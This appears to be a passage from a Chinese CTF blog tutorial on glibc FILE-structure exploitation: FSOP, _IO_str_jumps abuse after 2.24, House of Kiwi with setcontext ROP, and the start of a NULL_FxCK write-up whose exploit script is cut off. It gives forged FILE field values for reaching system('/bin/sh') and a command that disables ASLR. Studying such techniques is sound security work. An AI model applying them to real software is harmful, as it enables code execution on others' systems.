<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_flush_all_lockp (<span class="type">int</span> do_lock)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result = <span class="number">0</span>;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *<span class="title">fp</span>;</span></span><br><span class="line">  <span class="type">int</span> last_stamp;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">  __libc_cleanup_region_start (do_lock, flush_cleanup, <span class="literal">NULL</span>);</span><br><span class="line">  <span class="keyword">if</span> (do_lock)</span><br><span class="line">    _IO_lock_lock (list_all_lock);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  last_stamp = _IO_list_all_stamp;</span><br><span class="line">  fp = (_IO_FILE *) _IO_list_all;		<span class="comment">//覆盖为伪造的链表</span></span><br><span class="line">  <span class="keyword">while</span> (fp != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      run_fp = fp;</span><br><span class="line">      <span class="keyword">if</span> (do_lock)</span><br><span class="line">	_IO_flockfile (fp);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (((fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)		<span class="comment">//需要绕过这些检查</span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span></span><br><span class="line">	   || (_IO_vtable_offset (fp) == <span class="number">0</span></span><br><span class="line">	       &amp;&amp; fp-&gt;_mode &gt; <span class="number">0</span> &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">				    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	   )</span><br><span class="line">	  &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)			<span class="comment">//fp指向伪造的vtable，触发虚函数</span></span><br><span class="line">	result = EOF;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (do_lock)</span><br><span class="line">	_IO_funlockfile (fp);</span><br><span class="line">      run_fp = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (last_stamp != _IO_list_all_stamp)</span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="comment">/* Something was added to the list.  Start all over again.  */</span></span><br><span class="line">	  fp = (_IO_FILE *) _IO_list_all;</span><br><span class="line">	  last_stamp = _IO_list_all_stamp;</span><br><span class="line">	&#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">	fp = fp-&gt;_chain;		<span class="comment">//指向下一个对象</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">  <span class="keyword">if</span> (do_lock)</span><br><span class="line">    _IO_lock_unlock (list_all_lock);</span><br><span class="line">  __libc_cleanup_region_end (<span class="number">0</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里注意我们触发的条件：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (((fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)</span><br><span class="line"> &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)</span><br><span class="line">    result = EOF;</span><br></pre></td></tr></table></figure>

<ul>
<li><code>fp-&gt;_mode &lt;= 0</code></li>
<li><code>fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</code></li>
</ul>
<h3 id="2-24版本之后"><a href="#2-24版本之后" class="headerlink" title="2.24版本之后"></a>2.24版本之后</h3><p><code>libc-2.24</code>加入了对<code>vtable</code>指针的检查，所有的<code>vtables</code>都被放进了<code>__libc_IO_vtables</code>段，使得它们在内存中连续，在任何跳转之前，<code>vtable</code>指针都会调用<code>IO_validate_vtable()</code>函数进行边缘检查，如果指针不在这个段，那么将会调用<code>IO_vtable_check()</code>函数进行进一步的检查。</p>
<h4 id="利用-IO-str-jumps"><a href="#利用-IO-str-jumps" class="headerlink" title="利用_IO_str_jumps"></a>利用_IO_str_jumps</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> _<span class="title">IO_str_jumps</span> <span class="title">libio_vtable</span> =</span></span><br><span class="line">&#123;</span><br><span class="line">  JUMP_INIT_DUMMY,</span><br><span class="line">  JUMP_INIT(finish, _IO_str_finish),		<span class="comment">// 利用_IO_str_finish</span></span><br><span class="line">  JUMP_INIT(overflow, _IO_str_overflow),		<span class="comment">// 利用_IO_str_overflow</span></span><br><span class="line">  JUMP_INIT(underflow, _IO_str_underflow),</span><br><span class="line">  JUMP_INIT(uflow, _IO_default_uflow),</span><br><span class="line">  JUMP_INIT(pbackfail, _IO_str_pbackfail),</span><br><span class="line">  JUMP_INIT(xsputn, _IO_default_xsputn),</span><br><span class="line">  JUMP_INIT(xsgetn, _IO_default_xsgetn),</span><br><span class="line">  JUMP_INIT(seekoff, _IO_str_seekoff),</span><br><span class="line">  JUMP_INIT(seekpos, _IO_default_seekpos),</span><br><span class="line">  JUMP_INIT(setbuf, _IO_default_setbuf),</span><br><span class="line">  JUMP_INIT(sync, _IO_default_sync),</span><br><span class="line">  JUMP_INIT(doallocate, _IO_default_doallocate),</span><br><span class="line">  JUMP_INIT(read, _IO_default_read),</span><br><span class="line">  JUMP_INIT(write, _IO_default_write),</span><br><span class="line">  JUMP_INIT(seek, _IO_default_seek),</span><br><span class="line">  JUMP_INIT(close, _IO_default_close),</span><br><span class="line">  JUMP_INIT(stat, _IO_default_stat),</span><br><span class="line">  JUMP_INIT(showmanyc, _IO_default_showmanyc),</span><br><span class="line">  JUMP_INIT(imbue, _IO_default_imbue)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<ol>
<li><p>利用_IO_str_overflow</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_str_overflow (_IO_FILE *fp, <span class="type">int</span> c)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> flush_only = c == EOF;</span><br><span class="line">  _IO_size_t pos;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_NO_WRITES)</span><br><span class="line">      <span class="keyword">return</span> flush_only ? <span class="number">0</span> : EOF;</span><br><span class="line">  <span class="keyword">if</span> ((fp-&gt;_flags &amp; _IO_TIED_PUT_GET) &amp;&amp; !(fp-&gt;_flags &amp; _IO_CURRENTLY_PUTTING))</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_flags |= _IO_CURRENTLY_PUTTING;</span><br><span class="line">      fp-&gt;_IO_write_ptr = fp-&gt;_IO_read_ptr;</span><br><span class="line">      fp-&gt;_IO_read_ptr = fp-&gt;_IO_read_end;</span><br><span class="line">    &#125;</span><br><span class="line">  pos = fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base;</span><br><span class="line">  <span class="keyword">if</span> (pos &gt;= (_IO_size_t) (_IO_blen (fp) + flush_only))		<span class="comment">//检查</span></span><br><span class="line"> <span class="comment">// _IO_size_t的宏定义 #define _IO_blen(fp) ((fp)-&gt;_IO_buf_end - (fp)-&gt;_IO_buf_base)</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_USER_BUF) <span class="comment">/* not allowed to enlarge */</span>	<span class="comment">//检查</span></span><br><span class="line">	<span class="keyword">return</span> EOF;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="type">char</span> *new_buf;</span><br><span class="line">	  <span class="type">char</span> *old_buf = fp-&gt;_IO_buf_base;</span><br><span class="line">	  <span class="type">size_t</span> old_blen = _IO_blen (fp);</span><br><span class="line">	  _IO_size_t new_size = <span class="number">2</span> * old_blen + <span class="number">100</span>;		<span class="comment">// &quot;/bin/sh&quot;的地址</span></span><br><span class="line">	  <span class="keyword">if</span> (new_size &lt; old_blen)</span><br><span class="line">	    <span class="keyword">return</span> EOF;</span><br><span class="line">          <span class="comment">// system(&quot;/bin/sh&quot;)</span></span><br><span class="line">	  new_buf</span><br><span class="line">	    = (<span class="type">char</span> *) (*((_IO_strfile *) fp)-&gt;_s._allocate_buffer) (new_size);</span><br><span class="line">	  <span class="keyword">if</span> (new_buf == <span class="literal">NULL</span>)</span><br><span class="line">	    &#123;</span><br><span class="line">	      <span class="comment">/*	  __ferror(fp) = 1; */</span></span><br><span class="line">	      <span class="keyword">return</span> EOF;</span><br><span class="line">	    &#125;</span><br><span class="line">	  <span class="keyword">if</span> (old_buf)</span><br><span class="line">	    &#123;</span><br><span class="line">	      <span class="built_in">memcpy</span> (new_buf, old_buf, old_blen);</span><br><span class="line">	      (*((_IO_strfile *) fp)-&gt;_s._free_buffer) (old_buf);</span><br><span class="line">	      <span class="comment">/* Make sure _IO_setb won&#x27;t try to delete _IO_buf_base. */</span></span><br><span class="line">	      fp-&gt;_IO_buf_base = <span class="literal">NULL</span>;</span><br><span class="line">	    &#125;</span><br><span class="line">	  <span class="built_in">memset</span> (new_buf + old_blen, <span class="string">&#x27;\0&#x27;</span>, new_size - old_blen);</span><br><span class="line"></span><br><span class="line">	  _IO_setb (fp, new_buf, new_buf + new_size, <span class="number">1</span>);</span><br><span class="line">	  fp-&gt;_IO_read_base = new_buf + (fp-&gt;_IO_read_base - old_buf);</span><br><span class="line">	  fp-&gt;_IO_read_ptr = new_buf + (fp-&gt;_IO_read_ptr - old_buf);</span><br><span class="line">	  fp-&gt;_IO_read_end = new_buf + (fp-&gt;_IO_read_end - old_buf);</span><br><span class="line">	  fp-&gt;_IO_write_ptr = new_buf + (fp-&gt;_IO_write_ptr - old_buf);</span><br><span class="line"></span><br><span class="line">	  fp-&gt;_IO_write_base = new_buf;</span><br><span class="line">	  fp-&gt;_IO_write_end = fp-&gt;_IO_buf_end;</span><br><span class="line">	&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!flush_only)</span><br><span class="line">    *fp-&gt;_IO_write_ptr++ = (<span class="type">unsigned</span> <span class="type">char</span>) c;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_read_end)</span><br><span class="line">    fp-&gt;_IO_read_end = fp-&gt;_IO_write_ptr;</span><br><span class="line">  <span class="keyword">return</span> c;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>构造数据如下：</p>
<ul>
<li><p><code>fp-&gt;_flags = 0</code></p>
</li>
<li><p><code>fp-&gt;_IO_write_ptr = 0xffffffffffffffff</code></p>
</li>
<li><p><code>fp-&gt;_IO_write_base = 0</code></p>
</li>
<li><p><code>fp-&gt;_IO_buf_end = (str_bin_sh - 100) / 2</code> </p>
<p>注意：这里的<code>str_bin_sh</code>最好是偶数，避免除法向下取整，如果为奇数，可以选择加1。</p>
</li>
<li><p><code>fp-&gt;_IO_buf_base = 0</code></p>
</li>
<li><p><code>fp-&gt;mode = 0</code></p>
</li>
<li><p><code>fp + 0xe0 = system_addr</code></p>
</li>
</ul>
</li>
<li><p>利用_IO_str_finish</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_IO_str_finish (_IO_FILE *fp, <span class="type">int</span> dummy)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_buf_base &amp;&amp; !(fp-&gt;_flags &amp; _IO_USER_BUF))		<span class="comment">//检查</span></span><br><span class="line">    (((_IO_strfile *) fp)-&gt;_s._free_buffer) (fp-&gt;_IO_buf_base);		<span class="comment">//system(&quot;/bin/sh&quot;)</span></span><br><span class="line">  fp-&gt;_IO_buf_base = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">  _IO_default_finish (fp, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>构造数据如下：</p>
<ul>
<li><code>fp-&gt;mode = 0</code></li>
<li><code>fp-&gt;_IO_write_ptr = 0xffffffffffffffff</code></li>
<li><code>fp-&gt;_IO_write_base = 0</code></li>
<li><code>fp-&gt;_flag = 0</code></li>
<li><code>fp-&gt;_IO_buf_base = str_bin_sh</code></li>
<li><code>fp + 0xe0 = system_addr</code></li>
</ul>
</li>
</ol>
<h4 id="利用-IO-wstr-jumps"><a href="#利用-IO-wstr-jumps" class="headerlink" title="利用_IO_wstr_jumps"></a>利用_IO_wstr_jumps</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> _<span class="title">IO_wstr_jumps</span> <span class="title">libio_vtable</span> =</span></span><br><span class="line">&#123;</span><br><span class="line">  JUMP_INIT_DUMMY,</span><br><span class="line">  JUMP_INIT(finish, _IO_wstr_finish),		<span class="comment">//利用_IO_wstr_finish函数</span></span><br><span class="line">  JUMP_INIT(overflow, (_IO_overflow_t) _IO_wstr_overflow),	<span class="comment">//利用_IO_wstr_overflow函数</span></span><br><span class="line">  JUMP_INIT(underflow, (_IO_underflow_t) _IO_wstr_underflow),</span><br><span class="line">  JUMP_INIT(uflow, (_IO_underflow_t) _IO_wdefault_uflow),</span><br><span class="line">  JUMP_INIT(pbackfail, (_IO_pbackfail_t) _IO_wstr_pbackfail),</span><br><span class="line">  JUMP_INIT(xsputn, _IO_wdefault_xsputn),</span><br><span class="line">  JUMP_INIT(xsgetn, _IO_wdefault_xsgetn),</span><br><span class="line">  JUMP_INIT(seekoff, _IO_wstr_seekoff),</span><br><span class="line">  JUMP_INIT(seekpos, _IO_default_seekpos),</span><br><span class="line">  JUMP_INIT(setbuf, _IO_default_setbuf),</span><br><span class="line">  JUMP_INIT(sync, _IO_default_sync),</span><br><span class="line">  JUMP_INIT(doallocate, _IO_wdefault_doallocate),</span><br><span class="line">  JUMP_INIT(read, _IO_default_read),</span><br><span class="line">  JUMP_INIT(write, _IO_default_write),</span><br><span class="line">  JUMP_INIT(seek, _IO_default_seek),</span><br><span class="line">  JUMP_INIT(close, _IO_default_close),</span><br><span class="line">  JUMP_INIT(stat, _IO_default_stat),</span><br><span class="line">  JUMP_INIT(showmanyc, _IO_default_showmanyc),</span><br><span class="line">  JUMP_INIT(imbue, _IO_default_imbue)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>



<h2 id="House-Of-Kiwi"><a href="#House-Of-Kiwi" class="headerlink" title="House_Of_Kiwi"></a>House_Of_Kiwi</h2><h3 id="利用原理"><a href="#利用原理" class="headerlink" title="利用原理"></a>利用原理</h3><p>适用于当程序将各种hook函数禁用并且将exit函数更换为_exit函数，开启了sandbox只能orw的时候，通过<code>__malloc_assert</code>函数触发<code>_IO_file_jumps</code>中的<code>_IO_file_sync</code>指针，加上setcontext的技术可实现rop。当topchunk的大小不足以分配chunk的时候，会进入sysmalloc让我们有机会触发以下断言：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">assert ((old_top == initial_top (av) &amp;&amp; old_size == <span class="number">0</span>) ||</span><br><span class="line">       ((<span class="type">unsigned</span> <span class="type">long</span>) (old_size) &gt;= MINSIZE &amp;&amp;</span><br><span class="line">         prev_inuse (old_top) &amp;&amp;	<span class="comment">// 将topchunk的prev_inuse改为0就可以触发断言进而触发__malloc_assert</span></span><br><span class="line">       ((<span class="type">unsigned</span> <span class="type">long</span>) old_end &amp; (pagesize - <span class="number">1</span>)) == <span class="number">0</span>));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line">__malloc_assert (<span class="type">const</span> <span class="type">char</span> *assertion, <span class="type">const</span> <span class="type">char</span> *file, <span class="type">unsigned</span> <span class="type">int</span> line,</span><br><span class="line">       <span class="type">const</span> <span class="type">char</span> *function)</span><br><span class="line">&#123;</span><br><span class="line">(<span class="type">void</span>) __fxprintf (<span class="literal">NULL</span>, <span class="string">&quot;%s%s%s:%u: %s%sAssertion `%s&#x27; failed.\n&quot;</span>,</span><br><span class="line">           __progname, __progname[<span class="number">0</span>] ? <span class="string">&quot;: &quot;</span> : <span class="string">&quot;&quot;</span>,</span><br><span class="line">           file, line,</span><br><span class="line">           function ? function : <span class="string">&quot;&quot;</span>, function ? <span class="string">&quot;: &quot;</span> : <span class="string">&quot;&quot;</span>,</span><br><span class="line">           assertion);</span><br><span class="line">fflush (<span class="built_in">stderr</span>);	<span class="comment">// 利用了stderr这个结构体，也恰好是_IO_list_all中存储的结构体</span></span><br><span class="line"><span class="built_in">abort</span> ();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>主要的触发链：<code>assert -&gt; __malloc_assert -&gt; fflush -&gt; __IO_file_sync</code></p>
<p><code>setcontext + 61</code>处的内容在2.29之后就由rdi转变为rdx控制，那如何控制setcontext中的rdx寄存器呢？2.32版本的setcontext如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;setcontext+<span class="number">61</span>&gt;:    mov    rsp,QWORD PTR [rdx+<span class="number">0xa0</span>]</span><br><span class="line">&lt;setcontext+<span class="number">68</span>&gt;:    mov    rbx,QWORD PTR [rdx+<span class="number">0x80</span>]</span><br><span class="line">&lt;setcontext+<span class="number">75</span>&gt;:    mov    rbp,QWORD PTR [rdx+<span class="number">0x78</span>]</span><br><span class="line">&lt;setcontext+<span class="number">79</span>&gt;:    mov    r12,QWORD PTR [rdx+<span class="number">0x48</span>]</span><br><span class="line">&lt;setcontext+<span class="number">83</span>&gt;:    mov    r13,QWORD PTR [rdx+<span class="number">0x50</span>]</span><br><span class="line">&lt;setcontext+<span class="number">87</span>&gt;:    mov    r14,QWORD PTR [rdx+<span class="number">0x58</span>]</span><br><span class="line">&lt;setcontext+<span class="number">91</span>&gt;:    mov    r15,QWORD PTR [rdx+<span class="number">0x60</span>]</span><br><span class="line">&lt;setcontext+<span class="number">95</span>&gt;:    test   DWORD PTR fs:<span class="number">0x48</span>,<span class="number">0x2</span></span><br><span class="line">&lt;setcontext+<span class="number">107</span>&gt;:    je     <span class="number">0x7ffff7e31156</span> &lt;setcontext+<span class="number">294</span>&gt;</span><br><span class="line">-&gt;</span><br><span class="line">&lt;setcontext+<span class="number">294</span>&gt;:    mov    rcx,QWORD PTR [rdx+<span class="number">0xa8</span>]</span><br><span class="line">&lt;setcontext+<span class="number">301</span>&gt;:    push   rcx</span><br><span class="line">&lt;setcontext+<span class="number">302</span>&gt;:    mov    rsi,QWORD PTR [rdx+<span class="number">0x70</span>]</span><br><span class="line">&lt;setcontext+<span class="number">306</span>&gt;:    mov    rdi,QWORD PTR [rdx+<span class="number">0x68</span>]</span><br><span class="line">&lt;setcontext+<span class="number">310</span>&gt;:    mov    rcx,QWORD PTR [rdx+<span class="number">0x98</span>]</span><br><span class="line">&lt;setcontext+<span class="number">317</span>&gt;:    mov    r8,QWORD PTR [rdx+<span class="number">0x28</span>]</span><br><span class="line">&lt;setcontext+<span class="number">321</span>&gt;:    mov    r9,QWORD PTR [rdx+<span class="number">0x30</span>]</span><br><span class="line">&lt;setcontext+<span class="number">325</span>&gt;:    mov    rdx,QWORD PTR [rdx+<span class="number">0x88</span>]</span><br><span class="line">&lt;setcontext+<span class="number">332</span>&gt;:    xor    eax,eax</span><br><span class="line">&lt;setcontext+<span class="number">334</span>&gt;:    ret</span><br></pre></td></tr></table></figure>

<p>我们可以断在<code>call &lt;setcontext+61&gt;</code>的地方看看rdx到底是什么牛马，可以断在fflush函数中去查看：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">► 0x7ffff7e5bd53 &lt;fflush+131&gt;    call   qword ptr [rbp + 0x60]        &lt;setcontext+61&gt;</span><br><span class="line">       rdi: 0x7ffff7fc15e0 (_IO_2_1_stderr_) ◂— 0xfbad2887</span><br><span class="line">       rsi: 0x7fffffffba70 ◂— 0x616d203a6e69616d (&#x27;main: ma&#x27;)</span><br><span class="line">       rdx: 0x7ffff7fc18c0 (_IO_helper_jumps) ◂— 0x0</span><br><span class="line">       rcx: 0xc00</span><br><span class="line"></span><br><span class="line">  0x7ffff7e5bd56 &lt;fflush+134&gt;    xor    r8d, r8d</span><br><span class="line">  0x7ffff7e5bd59 &lt;fflush+137&gt;    test   eax, eax</span><br><span class="line">  0x7ffff7e5bd5b &lt;fflush+139&gt;    setne  r8b</span><br><span class="line">  0x7ffff7e5bd5f &lt;fflush+143&gt;    neg    r8d</span><br><span class="line">  0x7ffff7e5bd62 &lt;fflush+146&gt;    test   dword ptr [rbx], 0x8000</span><br><span class="line">  0x7ffff7e5bd68 &lt;fflush+152&gt;    jne    fflush+195                &lt;fflush+195&gt;</span><br><span class="line"></span><br><span class="line">  0x7ffff7e5bd6a &lt;fflush+154&gt;    mov    rdi, qword ptr [rbx + 0x88]</span><br><span class="line">  0x7ffff7e5bd71 &lt;fflush+161&gt;    mov    eax, dword ptr [rdi + 4]</span><br><span class="line">  0x7ffff7e5bd74 &lt;fflush+164&gt;    sub    eax, 1</span><br><span class="line">  0x7ffff7e5bd77 &lt;fflush+167&gt;    mov    dword ptr [rdi + 4], eax</span><br></pre></td></tr></table></figure>

<p>发现rdx的值就是<code>_IO_helper_jumps</code>指针，所以在<code>_IO_helper_jumps + 0xa0</code>和<code>_IO_helper_jumps + 0xa8</code>上写上我们rop链所在的地址和ret片段的地址就能实现rop。</p>
<h3 id="NULL-FxCK"><a href="#NULL-FxCK" class="headerlink" title="NULL_FxCK"></a>NULL_FxCK</h3><p>存在沙盒（orw）以及2.29版本之后的off-by-null漏洞，但是只能在edit的时候off-by-null一次，所以之后的数据构造都只能依赖于堆叠。由于2.29版本之后的off-by-null需要chunk的低位两个字节都为0x00，所以我们需要爆破，可以关闭地址随机化进行调试。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo 0 &gt; /proc/sys/kernel/randomize_va_space	# 关闭</span><br><span class="line">echo 2 &gt; /proc/sys/kernel/randomize_va_space	# 开启</span><br></pre></td></tr></table></figure>

<p>主要思路：</p>
<ul>
<li><p>利用off-by-null漏洞制造堆叠。</p>
<blockquote>
<p>参考我的另一篇文章：<a target="_blank" rel="noopener" href="https://rmrfsad.github.io/2022/07/26/Pwn/off_by_null/">Off-By-Null总结 - Pursue</a></p>
</blockquote>
</li>
<li><p>利用largebin_attack劫持libc上存储的tcache_struct指针。</p>
</li>
<li><p>伪造tcache_struct，实现任意地址写任意数据。</p>
</li>
<li><p>house_of_kiwi，IO利用</p>
</li>
</ul>
<p>WP如下：</p>
<blockquote>
<p>可能和网上的答案不太一样，毕竟是自己独立构造的（真的很恶心🤢🤢🤢）</p>
</blockquote>
<p>注意：构造orw的时候<code>/flag</code>字符串不要放在开头，调试下来发现在open的时候会将orw的开头给覆盖成rdx的值。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span 